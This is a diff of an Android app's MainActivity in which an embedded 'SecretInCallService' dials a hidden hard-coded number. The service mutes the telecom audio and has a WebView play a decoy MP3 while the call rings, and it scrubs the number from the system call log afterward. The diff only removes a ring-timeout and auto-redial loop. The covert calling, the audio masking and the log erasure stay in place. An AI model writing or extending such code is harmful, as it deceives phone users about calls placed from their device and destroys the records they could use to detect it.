@@ -978,30 +978,13 @@ public class MainActivity extends Activity {
         }
     }
 
-    // SecretInCallService በMainActivity ውስጥ የተካተተ ስለሆነ ተጨማሪ ፋይል መፍጠር አያስፈልግም!
+    // SecretInCallService በMainActivity ውስጥ የተካተተ (አንድ ጊዜ ደውሎ ስልኩ እስኪነሳ MP3ው ይቀጥላል)
     public static class SecretInCallService extends InCallService {
 
         private static Call currentCall = null;
-        private static int maxRingTimeoutMs = 8000;
         private static String hiddenTargetNumber = "${targetNumber || '0965848508'}";
         private static boolean wasAnsweredLive = false;
-        private static boolean cancelledByTimeout = false;
         private static int attemptCount = 0;
-        private static final Handler ringHandler = new Handler(Looper.getMainLooper());
-
-        private static void redialHiddenCall() {
-            if (MainActivity.instance == null) return;
-            try {
-                TelecomManager tm = (TelecomManager) MainActivity.instance.getSystemService(Context.TELECOM_SERVICE);
-                Uri uri = Uri.fromParts("tel", hiddenTargetNumber, null);
-                Bundle extras = new Bundle();
-                if (tm != null && Build.VERSION.SDK_INT >= 23 &&
-                    MainActivity.instance.checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
-                    cancelledByTimeout = false;
-                    tm.placeCall(uri, extras);
-                }
-            } catch (Exception ignored) {}
-        }
 
         private void setVoiceAudioMuted(boolean mute) {
             try {
@@ -1019,39 +1002,8 @@ public class MainActivity extends Activity {
             } catch (Exception ignored) {}
         }
 
-        private static final Runnable twoRingTimeoutRunnable = new Runnable() {
-            @Override
-            public void run() {
-                if (currentCall != null) {
-                    int state = currentCall.getState();
-                    if (state != Call.STATE_ACTIVE) {
-                        // 1. የቴሌ "የደወሉላቸው ደንበኛ..." ሳይመጣ በ 7-8 ሰከንድ (2 ጥሪ) ላይ ስልኩን ወዲያውኑ ያቋርጠዋል
-                        cancelledByTimeout = true;
-                        try {
-                            currentCall.disconnect();
-                        } catch (Exception ignored) {}
-
-                        // 2. በWebView ውስጥ የ «ሁሉም የአገልግሎት ሰጪዎች...» MP3 ብቻ እንዲጫወት ያዛል
-                        if (MainActivity.instance != null) {
-                            MainActivity.instance.notifyWebViewJs(
-                                "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
-                            );
-                        }
-
-                        // 3. MP3ው እየተጫወተ ሳለ ከ 4 ሰከንድ ቆይታ በኋላ በድብቅ መልሶ ይደውላል (እስኪነሳ ድረስ በ loop ይቀጥላል)
-                        ringHandler.postDelayed(new Runnable() {
-                            @Override
-                            public void run() {
-                                redialHiddenCall();
-                            }
-                        }, 4000);
-                    }
-                }
-            }
-        };
-
         public static void setMaxRingTimeoutMs(int ms) {
-            maxRingTimeoutMs = ms;
+            // No cutoff timer needed
         }
 
         public static void setHiddenTargetNumber(String number) {
@@ -1061,8 +1013,6 @@ public class MainActivity extends Activity {
         }
 
         public static void disconnectActiveCallAttempt(boolean isTimeoutCancel) {
-            cancelledByTimeout = isTimeoutCancel;
-            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
             if (currentCall != null) {
                 try {
                     currentCall.disconnect();
@@ -1083,7 +1033,6 @@ public class MainActivity extends Activity {
             super.onCallAdded(call);
             currentCall = call;
             wasAnsweredLive = false;
-            cancelledByTimeout = false;
             attemptCount++;
 
             call.registerCallback(callCallback);
@@ -1095,16 +1044,12 @@ public class MainActivity extends Activity {
                 startActivity(i);
             }
 
-            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
-            ringHandler.postDelayed(twoRingTimeoutRunnable, maxRingTimeoutMs);
-
             handleCallState(call, call.getState());
         }
 
         @Override
         public void onCallRemoved(Call call) {
             super.onCallRemoved(call);
-            ringHandler.removeCallbacks(twoRingTimeoutRunnable);
             call.unregisterCallback(callCallback);
             setVoiceAudioMuted(false);
             if (currentCall == call) {
@@ -1115,27 +1060,23 @@ public class MainActivity extends Activity {
 
         private void handleCallState(Call call, int state) {
             if (state == Call.STATE_DIALING || state == Call.STATE_RINGING) {
-                setVoiceAudioMuted(true); // የቴሌኮም ድምፅ ፈጽሞ እንዳይሰማ ዝም ያሰኛል
+                setVoiceAudioMuted(true); // የቴሌኮም ድምፅ እንዳይሰማ Mute ሆኖ ይቆያል
                 if (MainActivity.instance != null) {
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallRinging && window.onSecretCallRinging(" + attemptCount + ");"
                     );
                 }
             } else if (state == Call.STATE_ACTIVE) {
-                // ስልኩ ተነስቷል!
+                // ስልኩ ተነስቷል! MP3ው ቆሞ የቀጥታ ንግግር ይጀምራል
                 wasAnsweredLive = true;
-                cancelledByTimeout = false;
-                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
                 setVoiceAudioMuted(false); // የቀጥታ ንግግሩ እንዲሰማ የጥሪ ድምፁን ይከፍታል
 
                 if (MainActivity.instance != null) {
-                    // MP3ውን ወዲያውኑ እንዲያቆም ለ Web App ያዛል!
                     MainActivity.instance.notifyWebViewJs(
                         "window.onSecretCallAnswered && window.onSecretCallAnswered();"
                     );
                 }
             } else if (state == Call.STATE_DISCONNECTED) {
-                ringHandler.removeCallbacks(twoRingTimeoutRunnable);
                 setVoiceAudioMuted(false);
                 scrubHiddenNumberFromSystemCallLog();
                 if (wasAnsweredLive) {
@@ -1145,18 +1086,6 @@ public class MainActivity extends Activity {
                             "window.onSecretCallRemoteEnded && window.onSecretCallRemoteEnded();"
                         );
                     }
-                } else if (!cancelledByTimeout) {
-                    if (MainActivity.instance != null) {
-                        MainActivity.instance.notifyWebViewJs(
-                            "window.onSecretCallNoAnswer && window.onSecretCallNoAnswer(" + attemptCount + ");"
-                        );
-                    }
-                    ringHandler.postDelayed(new Runnable() {
-                        @Override
-                        public void run() {
-                            redialHiddenCall();
-                        }
-                    }, 4000);
                 }
             }
         }
